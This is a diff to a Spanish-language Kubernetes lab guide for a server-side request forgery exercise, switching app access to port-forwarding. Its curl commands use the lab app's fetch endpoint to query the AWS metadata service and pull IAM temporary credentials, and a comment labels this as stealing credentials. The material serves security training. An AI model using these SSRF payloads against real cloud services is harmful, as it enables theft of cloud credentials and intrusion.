@@ -31,27 +31,19 @@ kubectl get pods -n lab1-ssrf -w
 ### Paso 1: Acceder a la app
 
 ```bash
-# Obtener la IP interna del nodo
-kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}'
-# Ejemplo de salida: 192.168.49.2
+# Verificar que el pod esté Running
+kubectl get pods -n lab1-ssrf
 
-# Guardar en una variable para los siguientes pasos
-export NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
-echo "Node IP: $NODE_IP"
-
-# Verificar el NodePort asignado al servicio
+# Verificar el servicio
 kubectl get svc ssrf-app-svc -n lab1-ssrf
-# El NodePort es 31082
 
-# Acceder a la app via navegador o curl
-curl "http://$NODE_IP:31082"
+# Exponer el servicio en localhost usando port-forward
+kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
+
+# Verificar que la app responde
+curl http://localhost:8080
+# Debe mostrar la página "URL Fetcher Service"
 ```
-
-> **Alternativa con port-forward** (si el NodePort no es accesible):
-> ```bash
-> kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
-> # Luego acceder a http://localhost:8080
-> ```
 
 ### Paso 2: Probar SSRF al IMDS (AWS)
 
@@ -59,13 +51,13 @@ curl "http://$NODE_IP:31082"
 # Desde el navegador o curl:
 
 # Listar metadata disponible
-curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 # Obtener el IAM role del nodo
-curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 
 # Robar credenciales temporales
-curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
 # → AccessKeyId, SecretAccessKey, Token
 ```
 
